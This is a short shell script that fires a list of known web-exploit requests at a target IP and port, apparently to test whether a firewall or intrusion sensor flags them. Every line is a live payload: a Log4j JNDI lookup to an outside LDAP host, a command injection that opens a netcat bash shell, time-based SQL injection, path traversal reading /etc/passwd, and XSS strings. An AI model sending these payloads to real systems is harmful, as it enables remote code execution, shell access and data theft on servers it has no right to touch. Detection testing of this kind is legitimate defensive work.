if [ $# -lt 2 ]
then
echo "Usage: `basename $0` IP Port"
exit 1
fi

_SVCIP_=$1
_SVCPORT_=$2
echo $_SVCIP_:$_SVCPORT_ 

echo "===>"TEST Log4j
curl -s -k -o /dev/null -H "Content-Type: application/json" -H 'User-Agent: Mozilla/5.0 ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}' -d '{"names": ["sensor-1"]}' http://$_SVCIP_:$_SVCPORT_

echo "===>"TEST CCBill
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cgi-bin/ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash

echo "===>"TEST formmail
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cgi-sys/FormMail.cgi?%3Cscript%3Ealert%28%22test%22%29%3B%3C%2Fscript%3E

echo "===>"TEST SQLSleepFunction
curl -s -k -o /dev/null -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; Win64; x64; Trident/5.0)\'+(select*from(select(sleep(20)))a)+\'" -d '{"names": ["sensor-1"]}' http://$_SVCIP_:$_SVCPORT_

echo "===>"TEST WebcenterFatWireSatellite
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cs/Satellite?blobcol=urldata%26blobheadername1=content-type%26blobheadername2=Location%26blobheadervalue1=application/pdf%26blobheadervalue2=0;url=http://www.sec-consult.com%26blobkey=id%26blobnocache=false%26blobtable=MungoBlobs%26blobwhere=1342534304149%26ssbinary=true%26site=S08

echo "===>"TEST HyperSeek
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cgi-bin/suche/hsx.cgi?show=../../../../../../../etc/passwd%00 

echo "===>"TEST autohtml.php
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/autohtml.php?filename=../../../../../../../../../../../../../../../etc/passwd 

echo "===>"TEST anaconda
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cgi-bin/apexec.pl?etype=odp%26template=../../../../../../../../../directory/filename.ext%00.html%26passurl=/category/

echo "===>"TEST webplus 
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/cgi-bin/webplus?script=/../../../../etc/passwd 

echo "===>"TEST LinuxFileServerRequestForgery
curl -s -k -o /dev/null -X POST -d 'taskId=7&settings=%7B%22ctime%22%3A%201490796963%2C%20%22&schedule=%7B%7D&skipCtimeCheck=true' http://$_SVCIP_:$_SVCPORT_/cgi-bin/cgictl?action=setTaskSettings

echo "===>"TEST mailman
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/mailman/options/yourlist?language=en%26email=%3CSCRIPT%36alert%28'Can%20Cross%20Site%20Attack'%29%3C/SCRIPT%36

echo "===>"TEST ApacheTomcatServlet 
curl -s -k -o /dev/null http://$_SVCIP_:$_SVCPORT_/tomcat-server/servlet/org.apache.catalina.servlets.WebdavStatus/%3CSCRIPT%36alert%28document.domain%29%3C/SCRIPT%36
